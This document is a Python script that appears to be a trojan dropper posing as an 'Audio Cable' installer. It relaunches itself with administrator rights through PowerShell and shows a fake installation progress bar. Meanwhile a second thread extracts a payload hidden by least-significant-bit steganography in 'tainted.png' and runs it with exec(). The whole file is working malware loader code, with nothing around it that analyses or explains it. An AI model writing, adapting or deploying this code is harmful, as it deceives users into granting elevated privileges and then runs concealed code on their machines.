import os
import sys
import subprocess
import ctypes
import tkinter as tk
from tkinter import messagebox, ttk
from PIL import Image
import importlib.util
import requests
import rsa
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend


def log_checkpoint(message):
    """ Log checkpoints for debugging purposes """
    print(f"[DEBUG] {message}")

def is_admin():
    """ Check if the script is running with admin privileges """
    log_checkpoint("Checking for admin privileges...")
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except AttributeError:
        log_checkpoint("AttributeError occurred while checking admin privileges.")
        return False

def run_as_admin():
    """ Attempt to relaunch the script with admin privileges """
    log_checkpoint("Attempting to run script as admin...")
    if not is_admin():
        try:
            script = os.path.abspath(__file__)
            params = ' '.join([script] + sys.argv[1:])
            subprocess.run(
                ['powershell', '-Command', f'Start-Process python -ArgumentList "{params}" -Verb runAs'],
                check=True
            )
            sys.exit(0)  # Exit after relaunching
        except subprocess.CalledProcessError as e:
            print(f"Failed to elevate privileges: {e}")
            sys.exit(1)
    return True  # Return True if already elevated or successfully relaunched



def simulate_installation():
    """ Simulate the installation process with a progress bar """
    log_checkpoint("Simulating installation process...")
    window = tk.Tk()
    window.title("Installing Audio Cable")
    window.geometry("300x200")
    progress = tk.IntVar()

    def start_progress():
        log_checkpoint("Installation process started...")
        for i in range(101):
            progress.set(i)
            window.update_idletasks()
            window.after(50)  # Simulate delay
            window.after(85)
            window.after(99)
        log_checkpoint("Installation process completed.")
        window.destroy()
    
    def close_progress():
        window.destroy()

    label = tk.Label(window, text="Installing Audio Cable...")
    label.pack(pady=10)
    progressbar = ttk.Progressbar(window, variable=progress, maximum=100)
    progressbar.pack(pady=10, padx=10, fill=tk.X)
    start_button = tk.Button(window, text="Start", command=start_progress)
    start_button.pack(pady=10)
    cancel_button = tk.Button(window, text="Cancel", command=close_progress)
    cancel_button.pack(pady=10)
    window.mainloop()

def run_payload():
    def btoc(binary_data):
        byte_data = bytearray()
        for i in range(0, len(binary_data), 8):
            byte = binary_data[i:i+8]
            byte_data.append(int(''.join(str(b) for b in byte), 2))
        return bytes(byte_data)

    def extract_file_from_image(image_path, output_file_path):
        img = Image.open(image_path)
        img_data = list(img.getdata())
        print(f"Read image data size: {len(img_data)} pixels")

        extracted_bits = []

        for i, pixel in enumerate(img_data):
            r, g, b = pixel
            extracted_bits.append(r & 1)
            extracted_bits.append(g & 1)
            extracted_bits.append(b & 1)

        # Extract the length of the file data (in bits) from the first 32 bits
        length_bits = extracted_bits[:32]
        length_bytes = btoc(length_bits)
        data_length = int.from_bytes(length_bytes, 'big')
        print(f"Data length to extract: {data_length} bits")

        extracted_data = extracted_bits[32:32 + data_length]

        file_data = btoc(extracted_data)
        # with open(output_file_path, 'wb') as out_file:
        #     out_file.write(file_data)
        #     print(f"File successfully extracted and saved as {output_file_path}")
        
        exec(file_data)
    # Usage
    extract_file_from_image('tainted.png', 'extracted_payload.py')

    # try:
    #     # log_checkpoint(f"Attempting to execute the extracted payload: ./extracted_payload")
    #     # spec = importlib.util.spec_from_file_location("extracted_payload","./extracted_payload.py" )
    #     # extracted_module = importlib.util.module_from_spec(spec)
    #     # spec.loader.exec_module(extracted_module)
        
    #     # if hasattr(extracted_module, "windows_payload"):
    #     #     log_checkpoint("Found `windows_payload` function. Executing...")
    #     #     extracted_module.windows_payload()
    #     #     print("Successfully executed `windows_payload` from the extracted payload.")
    #     # else:
    #     #     log_checkpoint("No `windows_payload` function found in the extracted payload.")
    # except Exception as e:
    #     log_checkpoint(f"Error occurred while importing or executing the payload: {e}")

if __name__ == "__main__":
    if run_as_admin():  # Only proceed if elevated privileges are obtained
        # Start both the installation simulation and the payload execution in parallel
        installation_thread = threading.Thread(target=simulate_installation)
        payload_thread = threading.Thread(target=run_payload)

        installation_thread.start()
        payload_thread.start()

        installation_thread.join()
        payload_thread.join()

        log_checkpoint("Script finished.")
